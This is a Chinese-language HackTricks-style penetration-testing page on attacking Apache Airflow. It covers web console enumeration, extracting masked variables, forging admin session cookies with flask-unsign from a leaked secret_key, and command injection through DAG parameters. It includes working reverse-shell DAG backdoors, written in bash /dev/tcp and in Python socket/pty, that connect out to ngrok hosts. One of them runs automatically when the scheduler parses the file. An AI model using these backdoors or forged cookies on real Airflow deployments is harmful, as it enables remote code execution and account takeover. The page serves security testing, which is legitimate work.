# Apache Airflow Security

{{#include ../../banners/hacktricks-training.md}}

### 基本信息

[**Apache Airflow**](https://airflow.apache.org) 是一个用于 **编排和调度数据管道或工作流** 的平台。在数据管道的上下文中，“编排”一词指的是安排、协调和管理来自各种来源的复杂数据工作流的过程。这些编排的数据管道的主要目的是提供经过处理和可消费的数据集。这些数据集被广泛应用于众多应用程序，包括但不限于商业智能工具、数据科学和机器学习模型，所有这些都是大数据应用程序正常运行的基础。

基本上，Apache Airflow 允许您 **在某些事情发生时调度代码的执行**（事件，cron）。

### 本地实验室

#### Docker-Compose

您可以使用来自 [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) 的 **docker-compose 配置文件** 启动一个完整的 apache airflow docker 环境。（如果您使用的是 MacOS，请确保为 docker VM 提供至少 6GB 的 RAM）。

#### Minikube

运行 apache airflow 的一种简单方法是 **使用 minikube**：
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow 配置

Airflow 可能在其配置中存储 **敏感信息**，或者您可能会发现存在弱配置：

{{#ref}}
airflow-configuration.md
{{#endref}}

### Airflow RBAC

在攻击 Airflow 之前，您应该了解 **权限是如何工作的**：

{{#ref}}
airflow-rbac.md
{{#endref}}

### 攻击

#### Web 控制台枚举

如果您有 **访问 web 控制台** 的权限，您可能能够访问以下一些或全部信息：

- **变量**（自定义敏感信息可能存储在这里）
- **连接**（自定义敏感信息可能存储在这里）
- 在 `http://<airflow>/connection/list/` 访问它们
- [**配置**](./#airflow-configuration)（敏感信息如 **`secret_key`** 和密码可能存储在这里）
- 列出 **用户和角色**
- **每个 DAG 的代码**（可能包含有趣的信息）

#### 检索变量值

变量可以存储在 Airflow 中，以便 **DAG** 可以 **访问** 其值。这类似于其他平台的秘密。如果您有 **足够的权限**，可以在 GUI 中访问它们，地址为 `http://<airflow>/variable/list/`。\
Airflow 默认会在 GUI 中显示变量的值，但是，根据 [**这个**](https://marclamberti.com/blog/variables-with-apache-airflow/) 的说法，可以设置一个 **变量列表**，其 **值** 将在 **GUI** 中显示为 **星号**。

![](<../../images/image (164).png>)

然而，这些 **值** 仍然可以通过 **CLI**（您需要有数据库访问权限）、**任意 DAG** 执行、**API** 访问变量端点（API 需要被激活），甚至 **GUI 本身** 来 **检索**！\
要从 GUI 访问这些值，只需 **选择您想访问的变量**，然后 **点击操作 -> 导出**。\
另一种方法是对 **隐藏值** 进行 **暴力破解**，使用 **搜索过滤** 直到您获得它：

![](<../../images/image (152).png>)

#### 权限提升

如果 **`expose_config`** 配置设置为 **True**，从 **用户角色** 及 **以上** 可以 **读取** **web 中的配置**。在此配置中，**`secret_key`** 出现，这意味着任何拥有此有效密钥的用户都可以 **创建自己的签名 cookie 来冒充任何其他用户账户**。
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG 后门 (Airflow worker 中的 RCE)

如果您对 **DAG 保存的位置** 有 **写入权限**，您可以 **创建一个** 发送 **反向 shell** 的 **DAG**。\
请注意，这个反向 shell 将在 **airflow worker 容器** 内部执行：
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG 后门 (Airflow 调度器中的 RCE)

如果您将某些内容设置为 **在代码的根目录中执行**，在撰写本文时，它将在放置到 DAG 文件夹后几秒钟内 **由调度器执行**。
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG 创建

如果你成功**攻陷了 DAG 集群中的一台机器**，你可以在 `dags/` 文件夹中创建新的 **DAG 脚本**，它们将会在 DAG 集群中的其余机器上**复制**。

#### DAG 代码注入

当你从 GUI 执行一个 DAG 时，你可以**传递参数**给它。\
因此，如果 DAG 编写不当，它可能会**容易受到命令注入的攻击。**\
这就是在这个 CVE 中发生的情况: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

你需要知道的**开始寻找 DAG 中命令注入的方法**是**参数**是通过代码**`dag_run.conf.get("param_name")`**来**访问**的。

此外，**变量**也可能出现相同的漏洞（请注意，拥有足够权限的情况下，你可以在 GUI 中**控制变量的值**）。变量通过以下方式**访问**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
如果它们例如在 bash 命令中使用，您可能会执行命令注入。 

{{#include ../../banners/hacktricks-training.md}}
